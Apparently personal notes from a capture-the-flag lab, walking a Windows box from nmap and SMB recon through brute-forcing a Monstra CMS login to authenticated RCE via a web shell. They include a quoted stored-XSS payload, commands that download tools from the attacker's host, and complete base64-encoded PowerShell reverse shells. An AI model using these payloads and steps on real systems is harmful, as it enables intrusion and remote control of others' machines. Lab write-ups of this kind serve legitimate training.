# ip: 192.168.243.180

# my: 192.168.45.156

# reconnaissance

## port scan

> nmap -Pn -O -oN nmap.txt -sV -sC -p- --open 192.168.243.180

![](image_2.png)
![](image_3.png)
![](image_10.png)

- 135, 139, 445, openssl 1.1.1c, 3389, 5040, 7680, 49664~49669

## subdomain scan

- not found

> ffuf -u http://192.168.243.180 -H "Host:FUZZ.192.168.243.180" -w /usr/share/seclists/Discovery/DNS/namelist.txt

![](image_5.png)

## curl

> curl 192.168.243.180 -s | grep href

- assets path found
- accesssable assets path

![](image.png)

> curl 192.168.243.180/assets

- 301

![](image_1.png)

## mitmproxy

> apt install mitmproxy

```py
# remove_location.py
from mitmproxy import http

def response(flow: http.HTTPFlow):
    # Location header remove
    if "Location" in flow.response.headers:
        del flow.response.headers["Location"]
```

> mitmproxy -s remove_location.py -p 80
> curl -x http://127.0.0.1:80 http://192.168.243.180/assets

![](image_4.png)

> curl -x http://127.0.0.1:80 http://192.168.243.180/assets/

- accessable assets path
-

![](image_6.png)

> curl -x http://127.0.0.1:80 http://192.168.243.180/icons/back.gif

Kevin Hughes, Kevinh@eit.com, September 1995

![](image_8.png)

> curl -X GET -x http://127.0.0.1:80 http://192.168.243.180/assets/icons/folder.gif -O

mailto:postmaster@localhost -> webmaster
<span>Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10</span>

![](image_7.png)

## openssl 1.1.1c -> BOF -> not matching beacuase it is a vulnerability for game of half-life

/usr/share/exploitdb/exploits/linux/remote/22968.c

![](image_9.png)

## 443

## path scan

> ffuf -u http://192.168.243.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -fc 403

![](image_11.png)

- blog, assets

## access blog

> curl http://192.168.243.180/blog/

![](image_12.png)

- Monstra 3.0.4

> searchsploit Monstra

- found 3.0.4 -> 6

![](image_13.png)

Monstra CMS 3.0.4 - Remote Code Execution (Authenticated) | php/webapps/49949.py
Monstra CMS 3.0.4 - Remote Code Execution (RCE) | php/webapps/52038.py
Monstra cms 3.0.4 - Persitent Cross-Site Scripting | php/webapps/44502.txt

> apt install bat
> cat 52038.py | batcat

52038.py needs username, password

# 44502.txt

```
# Exploit Title: Monstra cms 3.0.4 - Persitent Cross-Site Scripting
# Date: 2018-04-14
# Exploit Author: Wenming Jiang
# Vendor Homepage: https://github.com/monstra-cms/monstra
# Software Link: https://github.com/monstra-cms/monstra
# Version: 3.0.4
# Tested on: php 5.6, apache2.2.29, macos 10.12.6
# CVE :CVE-2018-10109


#Description:
#Monstra CMS 3.0.4 has a stored XSS vulnerability when an attacker has access to the editor role, and enters the payload
#in the content section of a new page in the blog catalog.


#Steps to replicate:
#1. log into the system as an editor role
#2. creat a new page in the blog catalog
#3. navigate to content section
#4. enter payload: <script>alert(document.cookie)</script>
#5. visit http://<your_site>/monstra/blog/<page_name>.php, you will triage JavaScript execution



#Exploit Code:
<script>alert(document.cookie)</script>
or
<img src=1 onerror=alert(/xss/) >
```

> apt install smbclient
> smbclient --help

anonymous smbclient

> smbclient -L 192.168.243.180
> smbclient -L //192.168.243.180 -N

Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED

![](image_14.png)

smbclient -L //192.168.243.180 -N
session setup failed: NT_STATUS_ACCESS_DENIED

![](image_15.png)

> sudo apt install -y python3-impacket
> python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @192.168.243.180 | tee rpc

> rpcclient -U '' -N 192.168.243.180

TCP connection successs but! can not access with anonymous

![](image_16.png)

> smbclient -L //192.168.243.180 -N -p 139
> nmap -p139,445 --script smb-protocols 192.168.243.180

version >= 2 -> so not used smb1

![](image_17.png)

> apt install netexec
> nxc smb 192.168.243.180 -u '' -p '' --shares

MIKE-PC -> evidence found

![](image_26.png)

> apt install httpie
> http http://192.168.243.180/blog/

http://monster.pg/blog/home
http://monster.pg/blog/blog
http://monster.pg/blog/users
http://monster.pg/blog/users/login
http://monster.pg/blog/users/registration

![](image_19.png)

> vim /etc/hosts
> echo "192.168.243.180 monster.pg" >> /etc/hosts

![](image_20.png)

> http http://monster.pg/blog/users/

![](image_21.png)

> http http://monster.pg/blog/users/login/

![](image_22.png)

> http://monster.pg/blog/users/registration/

![](image_23.png)

## generate a custom words.txt file

> cewl http://192.168.243.180/ -w words.txt

## bruteforce login

http http://monster.pg/blog/users/login/

csrf token needed...

![](image_24.png)

./tmp/bruteforce_csrf_php.py
/usr/share/seclists/Usernames/Names/names.txt

check fail message

> curl -X POST http://monster.pg/blog/users/login/ --data "username=admin&password=admin&login_submit=Log+In&csrf=csrf_token"

> python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users words.txt --passwords /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt -T 20

![](image_25.png)

> python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users /usr/share
> /seclists/Usernames/Names/names.txt --passwords words.txt -T 10

![](image_27.png)

username: admin
email: wazowski@monster.pg
registered: 22.2.2022

> python3 52038.py http://monster.pg/blog admin wazowski

![](image_28.png)

success

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=whoami"
> mike-pc\mike

![](image_29.png)

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=whoami%20/priv"

Privilege Name Description State
============================= ==================================== ========
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled

## reverse shell

my ip: 192.168.45.156

> nc -lvnp 1234

https://www.revshells.com/
ps#1

> curl 'http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd='

> python3 -m http.server 80

> vim reverse.ps1

![](image_30.png)

![](image_31.png)

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/nc.exe -Outfile C:\Windows\Temp\nc.exe"

curl: (3) URL rejected: Malformed input to a URL function

whitespace -> %20

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/nc.exe%20-Outfile%20C:\Windows\Temp\nc.exe"

> http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/reverse.ps1 -Outfile C:\Windows\Temp\reverse.ps1

failed -> whitespace -> %20

> http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps1%20-Outfile%20C:\Windows\Temp\reverse.ps1

success

┌──(root㉿docker-desktop)-[/]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.243.180 - - [01/Nov/2026 02:44:47] "GET /reverse.ps1 HTTP/1.1" 200

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps1"

Retry

https://www.revshells.com/
ps#3

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/reverse.ps2%20-Outfile%20C:\Windows\Temp\reverse.ps2"

> curl "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-File%20C:\Windows\Temp\reverse.ps2"

retry

> curl 'http://monster.pg/blog/public/themes/default/zpsyc.chunk.php?cmd=whoami'

> curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=whoami"

> curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"

> curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguNDUuMTU2JywgMTIzNCk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki"

cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguNDUuMTU2JywgMTIzNCk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki

- 무반응
  원인은 Base64 인코딩 형식입니다. 지금 쓰는 Base64는 UTF-8이라 powershell -e가 기대하는 UTF-16LE가 아닙니다. revshells.com이 생성한 UTF-16LE Base64를 그대로 쓰거나, 직접 인코딩할 때 echo -n '...' | iconv -t UTF-16LE | base64 -w 0로 만들어야 합니다. UTF-8 Base64를 넣으면 PowerShell이 명령을 디코딩하지 못해 무반응입니다.

![](image_32.png)

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

> curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"

> curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

## reversing success!

![](image_33.png)
